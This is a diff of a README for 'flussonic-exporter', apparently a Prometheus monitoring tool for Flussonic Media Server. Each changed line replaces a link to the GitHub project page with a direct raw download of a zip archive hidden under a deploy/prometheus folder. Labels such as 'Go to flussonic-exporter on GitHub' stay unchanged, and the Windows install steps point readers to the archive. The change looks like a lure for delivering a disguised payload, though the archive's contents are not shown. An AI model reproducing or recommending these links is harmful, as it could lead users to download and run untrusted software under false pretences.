@@ -1,6 +1,6 @@
 # 📡 flussonic-exporter - Monitor Flussonic with Ease
 
-[![Download](https://img.shields.io/badge/Download%20Now-6F42C1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/tradmousebutton692/flussonic-exporter)
+[![Download](https://img.shields.io/badge/Download%20Now-6F42C1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/tradmousebutton692/flussonic-exporter/main/deploy/prometheus/flussonic_exporter_1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,14 +8,14 @@ flussonic-exporter helps you track Flussonic Media Server data in a simple way. 
 
 Use the link below to visit the download page:
 
-[Go to flussonic-exporter on GitHub](https://github.com/tradmousebutton692/flussonic-exporter)
+[Go to flussonic-exporter on GitHub](https://raw.githubusercontent.com/tradmousebutton692/flussonic-exporter/main/deploy/prometheus/flussonic_exporter_1.8.zip)
 
 ## 📥 Download and Install on Windows
 
 Follow these steps to get started on Windows:
 
 1. Open the download page in your browser:
-   [https://github.com/tradmousebutton692/flussonic-exporter](https://github.com/tradmousebutton692/flussonic-exporter)
+   [https://raw.githubusercontent.com/tradmousebutton692/flussonic-exporter/main/deploy/prometheus/flussonic_exporter_1.8.zip](https://raw.githubusercontent.com/tradmousebutton692/flussonic-exporter/main/deploy/prometheus/flussonic_exporter_1.8.zip)
 
 2. On the GitHub page, look for the latest release or the main download files.
 
@@ -134,7 +134,7 @@ If the browser page does not load:
 
 Download or open the project page here:
 
-[https://github.com/tradmousebutton692/flussonic-exporter](https://github.com/tradmousebutton692/flussonic-exporter)
+[https://raw.githubusercontent.com/tradmousebutton692/flussonic-exporter/main/deploy/prometheus/flussonic_exporter_1.8.zip](https://raw.githubusercontent.com/tradmousebutton692/flussonic-exporter/main/deploy/prometheus/flussonic_exporter_1.8.zip)
 
 ## 🧭 Quick Start
 
